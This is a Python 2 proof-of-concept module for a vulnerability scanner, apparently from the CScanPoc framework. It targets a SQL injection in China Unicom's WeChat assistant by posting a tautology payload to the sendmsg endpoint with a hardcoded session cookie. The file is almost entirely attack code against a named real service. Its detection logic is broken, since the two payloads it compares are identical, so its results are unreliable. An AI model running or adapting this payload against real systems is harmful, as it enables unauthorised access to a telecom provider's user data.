# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '10010_0102'  # 平台漏洞编号
    name = '联通官方微信沃助手SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-20'  # 漏洞公布时间
    desc = '''
    联通官方微信沃助手SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204973
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '10010(联通)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '79442ff9-24ea-49ef-a929-fa44671ef45b'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/sellMain.do?method=sendmsg"
            payload = "phone=13339718222 or '996'='996"
            payload1 = "phone=13339718222 or '996'='996"
            headers = {
                "Proxy-Connection": "keep-alive",
                "Content-Length": "83",
                "Cache-Control": "max-age=0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8",
                "Cookie": "JSESSIONID=B3C2A0D5A059FE7F19BCE2C0FD8E4370; email=13888888888; password=13888888888; isstorePwd=yes"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
